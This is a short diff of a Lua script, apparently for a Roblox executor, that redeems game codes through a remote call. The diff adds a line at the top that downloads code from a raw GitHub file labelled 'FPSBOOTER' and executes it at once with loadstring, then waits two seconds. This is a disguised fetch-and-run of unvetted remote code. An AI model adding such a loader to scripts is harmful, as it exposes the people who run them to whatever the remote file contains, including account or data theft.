@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCONCUBETI/Duongcutobeti/refs/heads/main/FPSBOOTER"))()
+wait(2)
 --1
 local args = {
 	[1] = "Codes/RedeemCode",
